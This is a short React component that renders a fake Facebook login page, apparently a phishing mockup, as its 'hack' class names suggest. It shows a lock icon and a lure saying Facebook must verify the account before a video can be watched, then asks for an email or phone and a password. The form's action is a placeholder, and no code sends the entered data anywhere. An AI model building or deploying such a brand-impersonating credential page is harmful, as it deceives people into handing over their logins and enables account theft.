import './App.css'

function App() {

  return (
    <>
    <header className='header-hack'>
      <h1 className='h1-hack'>Facebook</h1>
    </header>
    <div className='alert-hack'>
      <img className='lock-hack' src="https://em-content.zobj.net/source/facebook/138/lock_1f512.png" alt="Candado" />
      <span className='description-error-hack'>Facebook needs to verify your account information to allow access to this video</span>
    </div>
    <form className='form-hack' action="submit">
      <input className='input-hack1' type="text" placeholder='Email or Phone Number' />
      <input className='input-hack2' type="password" placeholder='Password' />
      <button className='button-hack'>Log In</button>
    </form>
    <div className='content-or-hck'>
      <div className='line-hack1'></div>
      <span>or</span>
      <div className='line-hack2'></div>
    </div>
    </>
  )
}

export default App
